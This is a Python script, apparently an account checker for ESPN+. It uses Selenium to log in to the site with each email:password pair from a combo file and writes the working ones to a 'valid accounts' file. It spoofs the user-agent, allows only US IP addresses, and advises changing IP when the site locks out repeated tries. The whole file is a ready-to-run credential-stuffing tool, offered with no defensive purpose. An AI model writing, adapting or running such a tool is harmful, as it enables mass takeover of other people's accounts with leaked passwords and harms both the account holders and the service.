import time
import requests
from headers.espn_plus import header
from bs4 import BeautifulSoup as soup
from modules.connection_error import connection_error_try_block as ip_country
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, TimeoutException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path

header()
file_directory = str(Path(__file__).parent)+'/espn+'
page = 'https://plus.espn.com/'
if 'US' not in str(ip_country()[1]):
	print('Current Location: {}'.format(ip_country()[1]))
	print('Please use a US IP to check accounts.\nEnding.')
	exit()
users = []
passwords = []
browser_options = Options()
browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
#browser_options.headless = True
with open(file_directory, 'r') as espn:	
	for line in espn.readlines():
		users.append(line.split(':')[0].strip())
		passwords.append(line.split(':')[1].strip())
index =0
while index < len(users):
	with open('espn_valid_accounts','a') as account_results:	
		try:			
			print('\rTrying combo {} from {}'.format(str(index), len(users)),end='')
			browser = webdriver.Chrome(options = browser_options)
			browser.set_window_size(500,700)
			browser.set_page_load_timeout(13)
			browser.get(page)
			time.sleep(5)
			login_button = browser.find_element_by_xpath('//*[@id="root"]/nav/div[3]/button')
			login_button.click()
			browser.switch_to.frame(0)
			time.sleep(2)
			original_login = browser.find_element_by_xpath('/html/body/div[1]/div/div/footer/p/a')
			original_login.click()
			email_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/section/section/form/section/div[1]/div/label/span[2]/input')
			email_box.send_keys(users[index])
			password_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/section/section/form/section/div[2]/div/label/span[2]/input')
			password_box .send_keys(passwords[index])
			log_in = browser.find_element_by_xpath('//*[@id="did-ui-view"]/div/section/section/form/section/div[3]/button')
			log_in.click()
			time.sleep(6)
			if browser.find_elements_by_xpath('//*[@id="did-ui-view"]/div/section/div/div/div'):
				invalid_email_text = browser.find_element_by_xpath('//*[@id="did-ui-view"]/div/section/div/div/div').text
				if 'The credentials you entered are incorrect' in str(invalid_email_text):
					print(' --> Bad Credentials {}:{}'.format(users[index],passwords[index]))
					account_results.write(users[index]+':'+passwords[index]+' ---> Bad \n')				
			if 'watch' in str(browser.current_url):
				print(' --> Success! {}:{}'.format(users[index],passwords[index]))				
				account_results.write(users[index]+':'+passwords[index]+' ---> Good \n')
			if browser.find_elements_by_xpath('//*[@id="did-ui-view"]/div/section/section/div[1]/p'):
				gate_locked_out = browser.find_element_by_xpath('//*[@id="did-ui-view"]/div/section/section/div[1]/p').text
				if "You've tried too many passwords" in str(gate_locked_out):
					print(' --> 429 Too Many Requests (Change IP or Wait a while) {}:{}'.format(users[index],passwords[index]))
			browser.close()
			index +=1	
		except ElementClickInterceptedException:		
			print(' --> Intercepted, Index not incremented')
			browser.close()
			continue
		except TimeoutException:
			print(' -- Timed out. Index not incremented.')
			browser.close()
			continue
		except NoSuchElementException:
			print(' --> Element not found, Index not incremented.')
			browser.close()
			continue

		except Exception as e:		
			print(e)
			print(' --> (stopped at combo {})'.format(users[index], passwords[index]))
			break
